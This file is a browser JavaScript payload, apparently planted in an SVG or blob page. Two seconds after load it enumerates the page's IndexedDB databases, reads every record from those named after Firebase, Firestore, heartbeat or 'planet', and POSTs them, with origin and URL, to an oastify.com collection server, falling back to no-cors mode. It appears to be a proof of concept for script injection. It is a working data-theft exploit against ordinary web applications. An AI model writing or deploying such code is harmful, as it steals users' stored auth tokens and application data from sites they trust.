svg.script:

console.clear();
console.log('═══════════════════════════════════════');
console.log('🗄️ DIRECT INDEXEDDB ACCESS');
console.log('═══════════════════════════════════════');
console.log('📍 Origin:', window.location.origin);
console.log('📍 URL:', window.location.href);
console.log('📍 Is blob:', window.location.href.startsWith('blob:'));

const statusLog = document.getElementById('statusLog');

function logStatus(message, isError = false) {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = isError ? '❌' : '✅';
    const entry = `[${timestamp}] ${prefix} ${message}`;
    console.log(entry);
    if (statusLog) {
        const color = isError ? '#f48771' : '#6a9955';
        statusLog.innerHTML += `<div style="color:${color}">${entry}</div>`;
        statusLog.scrollTop = statusLog.scrollHeight;
    }
}

// ============================================
// DIRECT INDEXEDDB ACCESS
// ============================================

// Function to get all databases
async function getAllDatabases() {
    try {
        const databases = await indexedDB.databases();
        console.log('📌 All databases:', databases.map(db => db.name));
        return databases;
    } catch (e) {
        console.error('Error listing databases:', e);
        return [];
    }
}

// Function to read a database
async function readDatabase(dbName) {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open(dbName);

        request.onerror = () => {
            reject(request.error);
        };

        request.onsuccess = () => {
            const db = request.result;
            const stores = Array.from(db.objectStoreNames);
            const result = {};

            if (stores.length === 0) {
                db.close();
                resolve(result);
                return;
            }

            let completed = 0;

            stores.forEach(storeName => {
                try {
                    const transaction = db.transaction(storeName, 'readonly');
                    const store = transaction.objectStore(storeName);
                    const getAllRequest = store.getAll();

                    getAllRequest.onsuccess = () => {
                        result[storeName] = getAllRequest.result;
                        completed++;
                        if (completed === stores.length) {
                            db.close();
                            resolve(result);
                        }
                    };

                    getAllRequest.onerror = () => {
                        result[storeName] = { error: getAllRequest.error?.message || 'Unknown error' };
                        completed++;
                        if (completed === stores.length) {
                            db.close();
                            resolve(result);
                        }
                    };
                } catch (e) {
                    result[storeName] = { error: e.message };
                    completed++;
                    if (completed === stores.length) {
                        db.close();
                        resolve(result);
                    }
                }
            });
        };
    });
}

// Function to send to server
async function sendToServer(data) {
    const serverUrl = 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb';

    logStatus(`📤 Sending to: ${serverUrl}`);
    console.log('📤 Payload:', JSON.stringify(data, null, 2));

    try {
        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                source: window.location.origin,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                data: data
            })
        });

        if (response.ok) {
            const result = await response.json();
            logStatus(`✅ Server response: ${response.status} - ${JSON.stringify(result)}`);
            console.log('Server response:', result);
        } else {
            const text = await response.text();
            logStatus(`❌ Server error: ${response.status} - ${text}`, true);
            console.error('Server error:', response.status, text);
        }
    } catch (error) {
        logStatus(`❌ Network error: ${error.message}`, true);
        console.error('Network error:', error);

        // Try with no-cors mode as fallback
        try {
            logStatus('🔄 Trying no-cors mode...');
            await fetch(serverUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    source: window.location.origin,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    data: data
                })
            });
            logStatus('✅ Request sent (no-cors mode) - check server logs');
        } catch (e2) {
            logStatus(`❌ No-cors also failed: ${e2.message}`, true);
        }
    }
}

// ============================================
// MAIN EXECUTION
// ============================================
async function main() {
    logStatus('🚀 Starting IndexedDB scan...');
    logStatus(`📍 Origin: ${window.location.origin}`);

    try {
        // Step 1: Get all databases
        const databases = await getAllDatabases();
        logStatus(`📌 Found ${databases.length} databases`);

        if (databases.length === 0) {
            logStatus('⚠️ No databases found');
            return;
        }

        // List all databases
        const dbNames = databases.map(db => db.name);
        logStatus(`📌 Databases: ${dbNames.join(', ')}`);

        // Step 2: Find Firebase databases
        const firebaseDBs = databases.filter(db => 
            db.name && (
                db.name.toLowerCase().includes('firebase') ||
                db.name.toLowerCase().includes('heartbeat') ||
                db.name.toLowerCase().includes('firestore') ||
                db.name.toLowerCase().includes('planet')
            )
        );

        if (firebaseDBs.length === 0) {
            logStatus('⚠️ No Firebase/heartbeat databases found');
            logStatus('💡 Looking for: firebase, heartbeat, firestore, planet');
            return;
        }

        logStatus(`✅ Found ${firebaseDBs.length} Firebase-related databases`);

        // Step 3: Read each database
        const allData = {};
        for (const dbInfo of firebaseDBs) {
            const dbName = dbInfo.name;
            logStatus(`📖 Reading database: ${dbName}`);

            try {
                const data = await readDatabase(dbName);
                allData[dbName] = data;

                const storeCount = Object.keys(data).length;
                const recordCount = Object.values(data).reduce((sum, store) => {
                    if (Array.isArray(store)) return sum + store.length;
                    return sum;
                }, 0);

                logStatus(`✅ ${dbName}: ${storeCount} stores, ${recordCount} records`);

                // Log sample data
                for (const [storeName, storeData] of Object.entries(data)) {
                    if (Array.isArray(storeData) && storeData.length > 0) {
                        console.log(`  📍 ${storeName}: ${storeData.length} records`);
                        console.log(`  Sample:`, storeData[0]);
                    }
                }

            } catch (error) {
                logStatus(`❌ Error reading ${dbName}: ${error.message}`, true);
            }
        }

        // Step 4: Send to server
        if (Object.keys(allData).length > 0) {
            const totalRecords = Object.values(allData).reduce((sum, db) => {
                return sum + Object.values(db).reduce((s, store) => {
                    if (Array.isArray(store)) return s + store.length;
                    return s;
                }, 0);
            }, 0);

            logStatus(`📤 Sending ${totalRecords} records to server...`);
            await sendToServer(allData);
        } else {
            logStatus('⚠️ No data to send');
        }

    } catch (error) {
        logStatus(`❌ Error: ${error.message}`, true);
        console.error('Error details:', error);
    }

    logStatus('✅ Scan complete');
    console.log('═══════════════════════════════════════');
}

// ============================================
// Auto-execute with delay
// ============================================

// Run when DOM is ready
if (document.readyState === 'complete') {
    setTimeout(main, 2000);
} else {
    window.addEventListener('load', function() {
        setTimeout(main, 2000);
    });
}

// Also run after iframe loads
const iframe = document.getElementById('planetIframe');
if (iframe) {
    iframe.addEventListener('load', function() {
        logStatus('📌 Iframe loaded');
    });
}

logStatus('⏳ Waiting for page load...');
